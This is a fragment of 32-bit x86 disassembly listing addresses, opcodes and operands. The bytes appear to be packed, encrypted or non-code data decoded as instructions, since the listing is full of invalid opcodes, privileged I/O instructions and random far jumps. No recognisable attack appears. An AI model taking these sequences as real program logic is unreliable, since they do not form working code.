  4144f3:	sbb    al,0x73
  4144f5:	or     DWORD PTR ds:0xc65a2f1b,ebx
  4144fb:	iret   
  4144fc:	push   cs
  4144fd:	scas   al,BYTE PTR es:[edi]
  4144fe:	adc    al,0xae
  414500:	cmp    al,0x22
  414502:	je     0x41450f
  414504:	mov    bh,0xd2
  414506:	sub    eax,0x1de6a727
  41450b:	add    eax,edx
  41450d:	pop    ebx
  41450e:	and    al,0x16
  414510:	rcl    BYTE PTR [ebx],1
  414512:	push   ss
  414513:	mov    al,0x3d
  414515:	fdivr  QWORD PTR [edx]
  414517:	mov    al,0x14
  414519:	jnp    0x41449d
  41451b:	outs   dx,BYTE PTR ds:[esi]
  41451c:	not    BYTE PTR [edx]
  41451e:	leave  
  41451f:	pop    ss
  414520:	clc    
  414521:	inc    edx
  414522:	daa    
  414523:	mov    DWORD PTR ds:0xebfba174,esp
  414529:	inc    ecx
  41452a:	push   ebp
  41452b:	inc    edi
  41452c:	(bad)  
  41452e:	pop    edi
  41452f:	xor    BYTE PTR [ebx],ah
  414531:	xchg   ecx,eax
  414532:	fisub  DWORD PTR [eax+0x63]
  414535:	lea    edi,[ebx-0xca6d7c]
  41453b:	mov    bh,0xf6
  41453d:	inc    eax
  41453e:	aaa    
  41453f:	aas    
  414540:	ficom  DWORD PTR [ebp+0x2f]
  414543:	test   BYTE PTR [edi],ah
  414545:	inc    ecx
  414546:	dec    edi
  414547:	cmp    al,BYTE PTR [eax]
  414549:	push   ebp
  41454a:	ja     0x414506
  41454c:	inc    esp
  41454d:	sub    bl,BYTE PTR [edx-0xa]
  414550:	sub    edx,ebx
  414552:	lods   al,BYTE PTR ds:[esi]
  414553:	sbb    BYTE PTR [edx],cl
  414555:	jae    0x414557
  414557:	fdiv   st,st(4)
  414559:	pop    es
  41455a:	add    al,0xa6
  41455c:	popf   
  41455d:	lods   al,BYTE PTR ds:[esi]
  41455e:	aad    0x14
  414560:	pushf  
  414561:	sti    
  414562:	mov    esi,0xe9e4073f
  414567:	sbb    dl,ch
  414569:	(bad)
  41456c:	or     BYTE PTR [eax-0x12],dl
  41456f:	lods   al,BYTE PTR cs:[esi]
  414571:	ins    DWORD PTR es:[edi],dx
  414572:	daa    
  414573:	in     al,0x68
  414575:	loopne 0x41452b
  414577:	ins    DWORD PTR es:[edi],dx
  414578:	jl     0x4145ab
  41457a:	push   es
  41457b:	jmp    0x6d6f:0xbe10cc7e
  414582:	(bad)  
  414583:	retf   0x7d18
  414586:	mov    BYTE PTR [edx+0x4d],al
  414589:	pop    eax
  41458a:	and    bl,0x11
  41458d:	in     al,dx
  41458e:	jae    0x4145e7
  414590:	jmp    0x57e9:0x70db71d2
  414597:	aam    0x22
  414599:	les    edi,FWORD PTR [ebx-0x1d]
  41459c:	jecxz  0x4145fe
  41459e:	ret    0xc985
  4145a1:	jmp    0xb1a15f2e
  4145a6:	ss loope 0x4145f1
  4145a9:	xor    al,0x5a
  4145ab:	sbb    dl,BYTE PTR [ebp+ebx*2+0x77]
  4145af:	pushf  
  4145b0:	mov    dh,0xe0
  4145b2:	xchg   ebp,eax
  4145b3:	ss cmp bl,dh
  4145b6:	inc    edi
  4145b7:	xchg   edx,eax
  4145b8:	sbb    ch,BYTE PTR [edx-0x45]
  4145bb:	ss mov dl,0x85
  4145be:	adc    eax,0xa09ba31a
  4145c3:	push   ds
  4145c4:	sar    BYTE PTR [esi+0x55873894],0x7c
  4145cb:	fdivr  QWORD PTR [eax]
  4145cd:	cmp    al,0xb3
  4145cf:	push   0xffffffa6
  4145d1:	cwde   
  4145d2:	add    edi,DWORD PTR [ebp+0xe]
  4145d5:	les    ebx,FWORD PTR [edi]
  4145d7:	ins    BYTE PTR es:[edi],dx
  4145d8:	and    al,0xc9
  4145da:	stos   BYTE PTR es:[edi],al
  4145db:	loop   0x4145e6
  4145dd:	jmp    0x414655
  4145df:	mov    ebx,DWORD PTR ds:0x532dfdb8
  4145e5:	xor    al,0x67
  4145e7:	daa    
  4145e8:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4145ea:	inc    esp
  4145eb:	add    eax,0xa62cc008
  4145f0:	leave  
  4145f1:	ret    0x38c8
  4145f4:	pop    ds
  4145f5:	and    esi,DWORD PTR [edx-0x4]
  4145f8:	enter  0xb565,0x96
  4145fc:	and    edx,DWORD PTR [esi]
  4145fe:	or     ebx,esi
  414600:	sbb    dl,ch
  414602:	and    dl,BYTE PTR [edi-0x20bcb06f]
  414608:	es jne 0x414603
  41460b:	inc    ebp
  41460c:	cld    
  41460d:	pop    edx
  41460e:	add    DWORD PTR [ebp-0x7e3a8ce0],edx
  414614:	push   0xf02d9706
  414619:	jg     0x414683
  41461b:	dec    esi
  41461c:	xor    al,0xb2
  41461e:	fimul  DWORD PTR [esi*2+0x6730e717]
  414625:	mov    ecx,0xdbbed933
  41462a:	cmp    eax,0x3db37bb0
  41462f:	es mov esp,0xf49cbe92
  414635:	rcr    BYTE PTR [esi+0x4dc2783],1
  41463b:	bound  esp,QWORD PTR [eax]
  41463d:	leave  
  41463e:	cli    
  41463f:	cmp    BYTE PTR [bp+di],ch
  414642:	cmp    eax,0x5082fbb6
  414647:	loop   0x414695
  414649:	dec    esp
  41464a:	into   
  41464b:	jb     0x4145fb
  41464d:	mov    esi,DWORD PTR [esi]
  41464f:	ins    DWORD PTR es:[edi],dx
  414650:	mov    ch,0x24
  414652:	dec    ecx
  414653:	mov    BYTE PTR [edi],al
  414655:	(bad)  
  414656:	shr    DWORD PTR [esp+edx*2-0x5a6d40ea],cl
  41465d:	aaa    
  41465e:	mov    bh,BYTE PTR [esi+0x20]
  414661:	rol    dh,1
  414663:	push   ebp
  414664:	ret    0xb933
  414667:	out    dx,eax
  414668:	inc    ecx
  414669:	iret   
  41466a:	adc    edi,0x68
  41466d:	and    ah,bl
  41466f:	add    BYTE PTR ds:0xf671028c,0xe5
  414676:	sbb    DWORD PTR [eax],0xffffff8f
  414679:	std    
  41467a:	jbe    0x414606
  41467c:	test   al,0xae
  41467e:	retf   0xd599
  414681:	inc    edi
  414682:	gs in  eax,dx
  414684:	outs   dx,BYTE PTR ds:[esi]
  414685:	sbb    DWORD PTR [edi],ebx
  414687:	mov    bl,BYTE PTR [edx+0x42]
  41468a:	in     al,dx
  41468b:	dec    edi
  41468c:	mul    BYTE PTR [ebx-0x22]
  41468f:	retf   
  414690:	jg     0xa4efaef0
  414696:	and    eax,DWORD PTR [edi+0x1eec938d]
  41469c:	into   
  41469d:	pusha  
  41469e:	(bad)  
  41469f:	xor    al,0x83
  4146a1:	jmp    0xfdf1d403
  4146a6:	pop    ebx
  4146a7:	xchg   edi,eax
  4146a8:	jp     0x414644
  4146aa:	xchg   DWORD PTR [ebx],edi
  4146ac:	or     ah,ah
  4146ae:	xor    ch,ah
  4146b0:	adc    DWORD PTR [edi-0x793beeb2],esi
  4146b6:	sub    DWORD PTR [eax],edi
  4146b8:	dec    esi
  4146b9:	pop    ebx
  4146ba:	push   ds
  4146bb:	popf   
  4146bc:	and    ch,BYTE PTR [ebp+ebp*1+0x28]
  4146c0:	jae    0x414679
  4146c2:	fidiv  DWORD PTR [edx-0x19]
  4146c5:	das    
  4146c6:	or     BYTE PTR [edx-0x40],dh
  4146c9:	jae    0x4146f1
  4146cb:	sbb    DWORD PTR [edi],ecx
  4146cd:	pop    ds
  4146ce:	stos   BYTE PTR es:[edi],al
  4146cf:	ja     0x41469f
  4146d1:	out    dx,eax
  4146d2:	(bad)  
  4146d3:	shl    DWORD PTR [ebp+0x7e6ef6fc],1
  4146d9:	jle    0x41469b
  4146db:	rol    BYTE PTR [esi+eax*1+0x2f016558],cl
  4146e2:	popa   
  4146e3:	jno    0x4146d9
  4146e5:	arpl   WORD PTR [edi-0x5f],di
  4146e8:	cmp    BYTE PTR [eax],0xad
  4146eb:	xchg   ecx,edx
  4146ed:	jne    0x4146ac
  4146ef:	push   ds
  4146f0:	fcmovne st,st(4)
  4146f2:	arpl   bx,sp
  4146f4:	sbb    bh,bh
  4146f6:	push   ds
  4146f7:	rcl    DWORD PTR [edi],1
  4146f9:	repz jp 0x4146da
  4146fc:	loope  0x4146c4
  4146fe:	int    0xcc
  414700:	inc    esp
  414701:	jg     0x4146cc
  414703:	aad    0xa1
  414705:	loopne 0x41476f
  414707:	fs dec eax
  414709:	cli    
  41470a:	in     al,0x11
  41470c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41470d:	and    al,bh
  41470f:	ins    DWORD PTR es:[edi],dx
  414710:	mov    WORD PTR [edi],?
  414712:	xor    DWORD PTR [edi],esi
  414714:	stc    
  414715:	iret   
  414716:	loope  0x414748
  414718:	out    dx,al
  414719:	cmp    DWORD PTR [ebp+0x34553d24],ebx
  41471f:	pop    ss
  414720:	pop    ds
  414721:	xor    bl,dl
  414723:	ins    DWORD PTR es:[edi],dx
  414724:	cmp    esi,ebp
  414726:	dec    ecx
  414727:	mov    ecx,0x24e31601
  41472c:	loope  0x4146cf
  41472e:	xor    bl,BYTE PTR [edi-0xa009023]
  414734:	(bad)  
  414735:	and    ch,BYTE PTR ds:0x58c06d96
  41473b:	push   ss
  41473c:	sti    
  41473d:	popf   
  41473e:	push   ebp
  41473f:	jmp    0x4147b8
  414741:	arpl   WORD PTR [ecx+edx*8+0x7f8d8d1a],dx
  414748:	test   DWORD PTR [eax-0x59],ebx
  41474b:	dec    esp
  41474c:	inc    ebp
  41474d:	pop    esp
  41474e:	test   ah,bl
  414750:	sti    
  414751:	(bad)  
  414752:	(bad)  
  414753:	or     BYTE PTR [esi+0x3e],bl
  414756:	and    al,0xe7
  414758:	ja     0x414732
  41475a:	es (bad) 
  41475c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41475d:	inc    ebx
  41475e:	adc    eax,0x5f0b197c
  414763:	inc    edx
  414764:	lock sub DWORD PTR [edx-0x345837f],ecx
  41476b:	cmp    eax,0xf0ec13e5
  414770:	cmp    ah,BYTE PTR [edx]
  414772:	push   0x65d80b7c
  414777:	adc    ebx,DWORD PTR [edx]
  414779:	mov    ch,bl
  41477b:	loope  0x4147ba
  41477d:	clc    
  41477e:	pop    ebx
  41477f:	test   eax,0xf15882c7
  414784:	pop    ebp
  414785:	or     DWORD PTR [edx],0x77
  414788:	xchg   esp,eax
  414789:	cmp    dl,BYTE PTR [edi+0x1f0249cf]
  41478f:	mov    dl,0x82
  414791:	and    al,0x35
  414793:	sub    ecx,DWORD PTR cs:[eax]
  414796:	scas   eax,DWORD PTR es:[edi]
  414797:	jae    0x414800
  414799:	addr16 jl 0x4147bd
  41479c:	not    DWORD PTR [edi+0x2aa3b473]
  4147a2:	pop    ss
  4147a3:	sbb    al,0xab
  4147a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147a6:	sub    DWORD PTR [ebx+0x0],ebp
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    ch,ch
  414975:	jle    0x414969
  414977:	ret    
  414978:	repz iret 
  41497a:	std    
  41497b:	jle    0x41495c
  41497d:	loope  0x4149c1
  41497f:	mov    al,0x3c
  414981:	shl    BYTE PTR [esi-0x3a],1
  414984:	in     eax,0x61
  414986:	add    DWORD PTR [eax],eax
  414988:	and    al,BYTE PTR [edi]
  41498a:	add    BYTE PTR [eax],al
  41498c:	add    BYTE PTR [edx+ebp*8+0x75],ch
  414990:	mov    ch,0x99
  414992:	inc    edi
  414993:	xlat   BYTE PTR ds:[ebx]
  414994:	fs jnp 0x4149ed
  414997:	neg    DWORD PTR [eax]
  414999:	mov    esi,0xab61d6c6
  41499e:	loopne 0x4149e0
  4149a0:	loope  0x41495c
  4149a2:	leave  
  4149a3:	hlt    
  4149a4:	movhps xmm1,QWORD PTR [eax+0xba5f4c5]
  4149ab:	hlt    
  4149ac:	icebp  
  4149ad:	shr    DWORD PTR [ecx+0x2c],0x63
  4149b1:	cmp    DWORD PTR [ebx+esi*2-0x49],eax
  4149b5:	mov    ds:0x14ca887d,al
  4149ba:	mov    edx,0x59145c78
  4149bf:	inc    ecx
  4149c0:	mov    WORD PTR [ebp+0x33a18b97],?
  4149c6:	scas   al,BYTE PTR es:[edi]
  4149c7:	xchg   ecx,eax
  4149c8:	xchg   ebp,eax
  4149c9:	jge    0x414a2f
  4149cb:	xor    DWORD PTR [eax+ecx*4],0xb86061a7
  4149d2:	lahf   
  4149d3:	cmc    
  4149d4:	sbb    eax,0x3aeb9376
  4149d9:	cmp    esi,eax
  4149db:	mov    eax,fs
  4149dd:	pop    edx
  4149de:	idiv   BYTE PTR [esi]
  4149e0:	cld    
  4149e1:	lahf   
  4149e2:	sub    DWORD PTR [eax-0x16],esp
  4149e5:	pop    ecx
  4149e6:	imul   ax,WORD PTR [edi],0x4794
  4149eb:	mov    edi,esp
  4149ed:	(bad)  
  4149ee:	jp     0x4149d2
  4149f0:	and    BYTE PTR ds:0x7b28dfde,0xa8
  4149f7:	push   edi
  4149f8:	pop    es
  4149f9:	dec    ebp
  4149fa:	sbb    eax,0x7b194de2
  4149ff:	jno    0x414a0e
  414a01:	or     eax,0x3612d930
  414a06:	test   al,0xe
  414a08:	jle    0x414a3e
  414a0a:	(bad)  
  414a0b:	xor    DWORD PTR [esi],ecx
  414a0d:	mov    esp,0xf4c6eb8e
  414a12:	inc    ebx
  414a13:	xlat   BYTE PTR ds:[ebx]
  414a14:	pop    eax
  414a15:	or     dh,BYTE PTR [edx]
  414a17:	jmp    0x414a6d
  414a19:	sar    BYTE PTR [edx+esi*1+0x25641647],1
  414a20:	cmp    BYTE PTR [ebx+0x17],dl
  414a23:	xor    al,0x9d
  414a25:	push   0xebbb1e75
  414a2a:	sar    DWORD PTR [esi+0x7f50201b],1
  414a30:	pop    esi
  414a31:	stos   BYTE PTR es:[edi],al
  414a32:	ja     0x414a23
  414a34:	push   cs
  414a35:	cmp    eax,0x6b896158
  414a3a:	adc    edi,DWORD PTR [eax+0x4a]
  414a3d:	inc    edi
  414a3e:	ss jne 0x414a0b
  414a41:	cmc    
  414a42:	xor    edi,DWORD PTR [edi-0x291fbd3f]
  414a48:	fsub   DWORD PTR [esi-0x7a]
  414a4b:	mov    ebp,0x6700188a
  414a50:	pop    edi
  414a51:	dec    al
  414a53:	loop   0x414a42
  414a55:	add    DWORD PTR [ebp-0x7c375c52],ebx
  414a5b:	clc    
  414a5c:	push   ebp
  414a5d:	mov    ah,0x3e
  414a5f:	adc    DWORD PTR [eax-0x451d9288],edx
  414a65:	or     al,0xc0
  414a67:	cmc    
  414a68:	inc    esi
  414a69:	into   
  414a6a:	add    eax,0x1f2b4674
  414a6f:	int3   
  414a70:	jmp    0xb31bbe14
  414a75:	popa   
  414a76:	(bad)  
  414a77:	push   eax
  414a78:	jecxz  0x414af7
  414a7a:	mov    esp,0x18394662
  414a7f:	cmp    eax,0x8c1f7d02
  414a84:	jge    0x414a4c
  414a86:	dec    edi
  414a87:	cmp    BYTE PTR [edi+ebx*4+0x2],0xa5
  414a8c:	add    ebp,DWORD PTR ds:0x8bba59a7
  414a92:	pop    esi
  414a93:	sbb    dh,al
  414a95:	add    cl,bl
  414a97:	fimul  DWORD PTR [eax-0x13]
  414a9a:	call   0x4eac:0xa03e226c
  414aa1:	adc    dl,dh
  414aa3:	mov    ah,0x0
  414aa5:	inc    edi
  414aa6:	jne    0x414a36
  414aa8:	shl    DWORD PTR [ebx],1
  414aaa:	outs   dx,DWORD PTR ds:[esi]
  414aab:	push   es
  414aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aad:	and    ch,al
  414aaf:	mov    BYTE PTR [esp+ecx*4],dl
  414ab2:	cmp    DWORD PTR [ecx+esi*8],esi
  414ab5:	lds    ebx,FWORD PTR [ebp+ecx*8-0x6134201e]
  414abc:	cmp    al,BYTE PTR [edi]
  414abe:	icebp  
  414abf:	std    
  414ac0:	pop    ss
  414ac1:	scas   al,BYTE PTR es:[edi]
  414ac2:	test   BYTE PTR cs:[ecx],bl
  414ac5:	pop    esi
  414ac6:	inc    esp
  414ac7:	add    eax,eax
  414ac9:	jmp    0xebafd208
  414ace:	xor    edi,DWORD PTR [eax+0x78611f9c]
  414ad4:	test   al,0x7e
  414ad6:	mov    ebx,0xd5b226b5
  414adb:	mov    esp,0x617af655
  414ae0:	retf   
  414ae1:	rcr    dh,1
  414ae3:	push   esi
  414ae4:	mov    ds:0xf2d203d2,eax
  414ae9:	cmp    eax,0xdd39c882
  414aee:	lds    edx,FWORD PTR [ebx-0x14d551b9]
  414af4:	pop    edx
  414af5:	mov    DWORD PTR [eax-0x4a],ebx
  414af8:	and    edi,DWORD PTR [edi+edx*8-0x40]
  414afc:	test   cl,ch
  414afe:	fild   DWORD PTR [edi]
  414b00:	es dec ebp
  414b02:	popa   
  414b03:	sahf   
  414b04:	test   al,0x76
  414b06:	(bad)  
  414b07:	(bad)  
  414b08:	add    al,bh
  414b0a:	ja     0x414b39
  414b0c:	sub    eax,DWORD PTR [esi]
  414b0e:	xor    al,0x64
  414b10:	add    DWORD PTR [ebx+ecx*1-0x41],ebx
  414b14:	mov    bh,BYTE PTR [edi-0x22715c1d]
  414b1a:	or     BYTE PTR [ebx-0x4b6e55e5],0x2d
  414b21:	pushf  
  414b22:	push   0x49
  414b24:	in     al,dx
  414b25:	daa    
  414b26:	xchg   ebp,eax
  414b27:	dec    edx
  414b28:	or     eax,0xb67c61cb
  414b2d:	pop    ebp
  414b2e:	es mov bl,0x78
  414b31:	mov    dh,al
  414b33:	nop
  414b34:	push   edx
  414b35:	adc    edx,DWORD PTR [ebx-0x10]
  414b38:	test   dl,cl
  414b3a:	push   ebx
  414b3b:	es aad 0x89
  414b3e:	push   ebp
  414b3f:	icebp  
  414b40:	push   edi
  414b41:	jmp    0x414b5f
  414b43:	repz arpl cx,si
  414b46:	or     BYTE PTR [eax+0x52],cl
  414b49:	xor    ecx,DWORD PTR [edi-0x60977a25]
  414b4f:	push   ds
  414b50:	mov    ds:0x9bd78c7e,eax
  414b55:	scas   eax,DWORD PTR es:[edi]
  414b56:	not    DWORD PTR [ebp+0x2b]
  414b59:	sbb    eax,0xd782ee9f
  414b5e:	fwait
  414b5f:	icebp  
  414b60:	sbb    al,0x9a
  414b62:	aas    
  414b63:	shr    DWORD PTR [ebx+0x5cc97aee],1
  414b69:	adc    dl,BYTE PTR [ecx+eax*2+0x59]
  414b6d:	icebp  
  414b6e:	(bad)  
  414b6f:	fmul   DWORD PTR ds:0xf6e59ac7
  414b75:	das    
  414b76:	out    dx,al
  414b77:	xchg   ebx,eax
  414b78:	lahf   
  414b79:	mov    ds:0xd5bd66de,al
  414b7e:	mov    bl,0xc3
  414b80:	or     DWORD PTR ds:0x39a5efc2,esp
  414b86:	bound  ebp,QWORD PTR [ebx-0xc56435d]
  414b8c:	sbb    dl,BYTE PTR [edi]
  414b8e:	fld    TBYTE PTR [edx-0x80]
  414b91:	or     dh,ch
  414b93:	xlat   BYTE PTR ds:[ebx]
  414b94:	pusha  
  414b95:	jo     0x414b43
  414b97:	fsub   DWORD PTR [eax-0x13c7650e]
  414b9d:	ret    0xbbed
  414ba0:	retf   
  414ba1:	jecxz  0x414b62
  414ba3:	and    eax,0xfa75d955
  414ba8:	fnop   
  414baa:	mov    BYTE PTR [ebx-0x6b],cl
  414bad:	stos   DWORD PTR es:[edi],eax
  414bae:	into   
  414baf:	(bad)  
  414bb0:	jb     0x414bb0
  414bb2:	int    0xf
  414bb4:	cdq    
  414bb5:	jge    0x414c0d
  414bb7:	stc    
  414bb8:	inc    eax
  414bb9:	std    
  414bba:	in     al,0x80
  414bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bbd:	push   esi
  414bbe:	dec    edx
  414bbf:	and    ecx,edx
  414bc1:	shr    DWORD PTR [esi],0x46
  414bc4:	sar    DWORD PTR ds:[esi],0x2c
  414bc8:	mov    al,0x22
  414bca:	dec    esi
  414bcb:	sub    BYTE PTR ds:0x4df12096,0x66
  414bd2:	(bad)  ds:0xad17873
  414bd8:	hlt    
  414bd9:	jmp    0x414c47
  414bdb:	daa    
  414bdc:	sub    eax,0x62daa2c7
  414be1:	cmp    al,al
  414be3:	lods   eax,DWORD PTR ds:[esi]
  414be4:	sub    DWORD PTR [ecx+0x3d],ebx
  414be7:	mov    BYTE PTR [ecx+0x72c10291],dl
  414bed:	mov    edx,0xe01ec8e5
  414bf2:	cwde   
  414bf3:	enter  0xf951,0xea
  414bf7:	mov    edi,0x1be66d9d
  414bfc:	cmp    BYTE PTR [ecx+0x28],0x4c
  414c00:	pop    esp
  414c01:	sub    DWORD PTR [edx],ebx
  414c03:	push   ebp
  414c04:	jecxz  0x414bab
  414c06:	daa    
  414c07:	ja     0x414c58
  414c09:	in     al,0xa7
  414c0b:	adc    BYTE PTR [ebx+0x47],bl
  414c0e:	jb     0x414c04
  414c10:	and    ebp,DWORD PTR [ebx+0x57bb3f66]
  414c16:	inc    eax
  414c17:	mov    al,ds:0xcf59405d
  414c1c:	add    DWORD PTR ds:0x9bbf2fd,ebp
  414c22:	jmp    0xd6cf:0x27afd707
  414c29:	jmp    DWORD PTR [ebx+eiz*1+0x65809215]
  414c30:	or     ecx,DWORD PTR [ebx-0x6b]
  414c33:	sbb    ecx,DWORD PTR ds:0x83645f15
  414c39:	dec    edx
  414c3a:	lock cmp BYTE PTR [eax-0x111e88d4],bh
  414c41:	sbb    BYTE PTR [ebp+0x40],ch
  414c44:	(bad)  [edi]
  414c46:	jbe    0x414c2b
  414c48:	xchg   esi,eax
  414c49:	mov    al,ds:0x7033abf4
  414c4e:	jae    0x414c04
  414c50:	or     ecx,DWORD PTR [edi+ebx*1-0x31111]
  414c57:	lock aaa 
  414c59:	rcr    BYTE PTR [edx-0xe4cd22d],1
  414c5f:	je     0xcd012860
  414c65:	push   cs
  414c66:	mov    dl,0x1f
  414c68:	push   ebp
  414c69:	sbb    al,0x24
  414c6b:	je     0x414c76
  414c6d:	bound  eax,QWORD PTR [ebx-0x72]
  414c70:	fld    DWORD PTR [edx+0x74]
  414c73:	int3   
  414c74:	pushf  
  414c75:	je     0x414ccf
  414c77:	test   BYTE PTR [ecx],0x9a
  414c7a:	addr16 inc ebp
  414c7c:	lea    edi,[esi-0x37]
  414c7f:	mov    ebp,edx
  414c81:	jnp    0x414cbf
  414c83:	cmc    
  414c84:	push   ds
  414c85:	sub    cl,BYTE PTR [edx+0x72]
  414c88:	xor    bl,BYTE PTR [eax+ebp*1]
  414c8b:	pop    edx
  414c8c:	or     eax,0x641b1b7e
  414c91:	popa   
  414c92:	sub    edi,0x36713b18
  414c98:	inc    esi
  414c99:	scas   al,BYTE PTR es:[edi]
  414c9a:	in     al,0x1f
  414c9c:	loop   0x414d15
  414c9e:	pop    ecx
  414c9f:	out    dx,al
  414ca0:	push   ebp
  414ca1:	add    edi,eax
  414ca3:	push   0xefdfe284
  414ca8:	mov    bl,0xf9
  414caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cab:	cmp    al,0x29
  414cad:	mov    bl,bl
  414caf:	xor    ebx,eax
  414cb1:	shl    DWORD PTR [esi+0xc37e3d],0x1b
  414cb8:	sub    DWORD PTR [ecx-0x7d],esp
  414cbb:	push   esi
  414cbc:	adc    edi,ebx
  414cbe:	in     al,0xe
  414cc0:	lds    ebp,FWORD PTR [esi+0x4f041dc1]
  414cc6:	gs ds in eax,dx
  414cc9:	cmp    BYTE PTR [edi],dl
  414ccb:	shl    BYTE PTR [ebx+eiz*8+0xe],cl
  414ccf:	push   edi
  414cd0:	retf   
  414cd1:	and    ebp,DWORD PTR ds:0x308d51ca
  414cd7:	push   edi
  414cd8:	sti    
  414cd9:	xor    edi,DWORD PTR [edi+0x7e]
  414cdc:	mov    eax,0xebb2d2bf
  414ce1:	pop    ss
  414ce2:	push   edx
  414ce3:	stos   BYTE PTR es:[edi],al
  414ce4:	dec    edx
  414ce5:	adc    eax,0xc432675f
  414cea:	lods   eax,DWORD PTR ds:[esi]
  414ceb:	call   DWORD PTR [eax]
  414ced:	mov    esi,0xa792f3ea
  414cf2:	push   ecx
  414cf3:	(bad)  
  414cf4:	call   0xedf21eb3
  414cf9:	cli    
  414cfa:	dec    BYTE PTR [eax]
  414cfc:	addr16 out 0x8e,eax
  414cff:	pop    ecx
  414d00:	bnd jb 0x414d2e
  414d03:	fadd   QWORD PTR [ecx]
  414d05:	sub    eax,DWORD PTR [esi]
  414d07:	call   edx
  414d09:	cmp    DWORD PTR ds:0xd483fe24,ebx
  414d0f:	dec    ecx
  414d10:	in     eax,0xbe
  414d12:	and    DWORD PTR [eax+0x127ac16c],0x72
  414d19:	fadd   QWORD PTR [ecx-0x79308c9f]
  414d1f:	stc    
  414d20:	jmp    0xcd89:0x825e7977
  414d27:	mov    ah,0xf
  414d29:	cld    
  414d2a:	loop   0x414d6a
  414d2c:	mov    DWORD PTR [ebx],0xef2506ec
  414d32:	mov    dh,0x19
  414d34:	lea    esi,[ecx+0x6a]
  414d37:	jbe    0x414d3c
  414d39:	jo     0x414d21
  414d3b:	bound  esi,QWORD PTR [ecx-0x20]
  414d3e:	xor    al,0x4a
  414d40:	leave  
  414d41:	out    dx,al
  414d42:	lods   eax,DWORD PTR ds:[esi]
  414d43:	cmp    edi,edi
  414d45:	sub    al,0x4
  414d47:	jecxz  0x414d17
  414d49:	je     0x414d47
  414d4b:	mov    ebx,0x88665513
  414d50:	or     BYTE PTR [ebp-0x19],al
  414d53:	cmp    ebx,ebx
  414d55:	(bad)  
  414d56:	stos   DWORD PTR es:[edi],eax
  414d57:	xchg   edi,eax
  414d58:	add    bh,cl
  414d5a:	mov    ebx,0x50f1382a
  414d5f:	mov    dh,0x7c
  414d61:	pop    ebx
  414d62:	pop    ebp
  414d63:	dec    esi
  414d64:	inc    edx
  414d65:	cmp    ah,BYTE PTR [ecx+0x53]
  414d68:	sub    eax,0x3a9adebc
  414d6d:	aad    0xc1
  414d6f:	inc    esi
  414d70:	mov    ebp,0x483ab083
  414d75:	xchg   ecx,eax
  414d76:	in     eax,0x2a
  414d78:	mov    edx,0x3605a9ca
  414d7d:	xchg   DWORD PTR [esi-0xe13bbcc],ebp
  414d83:	jbe    0x414dab
  414d85:	mov    edi,DWORD PTR [eax]
  414d87:	pop    ebx
  414d88:	or     BYTE PTR [ebx-0x2a28788a],0xe2
  414d8f:	int    0x36
  414d91:	rcr    DWORD PTR [eax+0x7148f39b],0xf9
  414d98:	xor    DWORD PTR gs:[ebp+0x2d7b8e40],0x3acd3d4d
  414da3:	mov    ds:0x538412ad,al
  414da8:	mov    ch,0xae
  414daa:	leave  
  414dab:	and    al,0x9
  414dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dae:	sti    
  414daf:	xor    bh,BYTE PTR [esi]
  414db1:	imul   ebx,DWORD PTR [edi+0x55],0xffffffe2
  414db5:	aas    
  414db6:	mov    al,0x89
  414db8:	out    dx,eax
  414db9:	add    al,0xaf
  414dbb:	mov    dh,0x71
  414dbd:	xor    ah,BYTE PTR [edi]
  414dbf:	in     eax,dx
  414dc0:	call   0x318c07be
  414dc5:	or     eax,0x74f08579
  414dca:	mov    esi,0x9c9a99cb
  414dcf:	push   edi
  414dd0:	iret   
  414dd1:	cdq    
  414dd2:	aas    
  414dd3:	jno    0x414e4e
  414dd5:	int    0x10
  414dd7:	sbb    esp,DWORD PTR [edx+0x1b5a88e9]
  414ddd:	repnz cmp al,0xd0
  414de0:	and    DWORD PTR [eax+0x351d5e98],esi
  414de6:	or     eax,0xb1f45e54
  414deb:	(bad)  cs:[edi-0x46]
  414def:	sbb    DWORD PTR [edx-0x61],ebp
  414df2:	mov    edx,DWORD PTR [eax-0x4e959c62]
  414df8:	dec    ebp
  414df9:	scas   eax,DWORD PTR es:[edi]
  414dfa:	inc    esi
  414dfb:	fnsave [edx]
  414dfd:	jmp    FWORD PTR ds:0x64052567
  414e03:	lods   al,BYTE PTR ds:[esi]
  414e04:	in     eax,0xa6
  414e06:	mov    esp,0xe5cd6519
  414e0b:	push   esp
  414e0c:	pop    eax
  414e0d:	mov    ebx,0x67d2530b
  414e12:	mov    dl,0xac
  414e14:	ret    
  414e15:	add    ch,0x53
  414e18:	cmp    BYTE PTR ds:0x7c48436e,bl
  414e1e:	xchg   edx,eax
  414e1f:	mov    dh,0xc2
  414e21:	jbe    0x414e76
  414e23:	push   edx
  414e24:	pop    eax
  414e25:	xor    DWORD PTR [eax],edx
  414e27:	inc    esp
  414e28:	es es mov dl,0xaa
  414e2c:	fstp   QWORD PTR [ecx+0x5f]
  414e2f:	adc    BYTE PTR [ecx+0x552d2cf1],0xc9
  414e36:	jbe    0x414e32
  414e38:	jge    0x414ea1
  414e3a:	adc    DWORD PTR [edx+0x17],edx
  414e3d:	retf   
  414e3e:	dec    ebx
  414e3f:	push   ss
  414e40:	mov    bl,0x17
  414e42:	push   edi
  414e43:	adc    esi,ebp
  414e45:	dec    DWORD PTR [ebp+0x1b]
  414e48:	mov    esi,DWORD PTR [esi-0x5a8c037c]
  414e4e:	je     0x414e09
  414e50:	neg    DWORD PTR [ebx+0x1e]
  414e53:	scas   eax,DWORD PTR es:[edi]
  414e54:	dec    ebx
  414e55:	repnz xchg ebx,eax
  414e57:	rcr    DWORD PTR [ebx],cl
  414e59:	jge    0x414eb9
  414e5b:	and    al,dl
  414e5d:	popa   
  414e5e:	jo     0x414e3a
  414e60:	pop    ds
  414e61:	jle    0x414ea3
  414e63:	push   ss
  414e64:	mov    eax,0x7e2e5ddb
  414e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e6a:	imul   esi,DWORD PTR ds:0xad8f3d12,0xffffff97
  414e71:	mov    cl,0x34
  414e73:	push   ebx
